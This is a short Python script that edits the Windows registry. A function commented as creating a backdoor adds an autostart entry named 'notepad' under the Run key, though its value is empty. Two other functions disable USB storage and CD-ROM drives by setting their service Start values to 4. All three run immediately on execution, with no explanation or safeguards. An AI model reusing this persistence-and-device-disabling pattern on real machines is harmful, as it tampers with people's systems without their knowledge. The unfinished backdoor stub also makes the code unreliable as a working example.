from winreg import *

#This is Fuction for Create Backdoor
def run_app():
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        key = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER,keyVal)
    SetValueEx(key,"notepad",0,REG_SZ,"")
    CloseKey(key)

#This is Fuction for Disable Usb Storage
def disable_usb_ports():
    keyVal = r'SYSTEM\CurrentControlSet\Services\USBSTOR'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)
    SetValueEx(key,"start",0,REG_DWORD,4)
    CloseKey(key)

#This is Function for Disable CDROM
def disable_cdrom():
    keyVal = r'SYSTEM\CurrentControlSet\Services\cdrom'
    try:
        key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)
    SetValueEx(key,"start",0,REG_DWORD,4)
    CloseKey(key)

    
disable_cdrom()
disable_usb_ports()
run_app()
